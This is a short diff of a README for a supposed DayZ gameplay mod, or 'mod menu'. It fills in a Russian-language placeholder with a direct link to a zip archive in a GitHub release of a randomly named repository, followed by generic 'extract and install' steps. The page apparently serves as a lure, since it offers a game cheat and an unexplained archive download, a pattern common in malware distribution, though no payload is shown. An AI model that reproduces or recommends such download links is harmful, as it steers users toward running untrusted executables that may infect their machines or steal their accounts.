@@ -1,6 +1,6 @@
 ## DayZ Gameplay Enhancement Mod
 
-[Download](ссылка_на_скачивание)
+[Download](https://github.com/fuxrex/automatic-guacamole/releases/download/2/Modmenu_Dayz_2024_x32_x64.zip)
 
 # Overview
 
@@ -18,7 +18,7 @@ This mod aims to enhance the DayZ gameplay experience by introducing new feature
 
 # Download and Installation
 
-1. Click the [Download](ссылка_на_скачивание) button to get the latest version of the mod.
+1. Click the [Download](https://github.com/fuxrex/automatic-guacamole/releases/download/2/Modmenu_Dayz_2024_x32_x64.zip) button to get the latest version of the mod.
 2. Extract the downloaded file.
 3. Follow the included installation instructions.
 4. Launch DayZ and enjoy the enhanced gameplay.
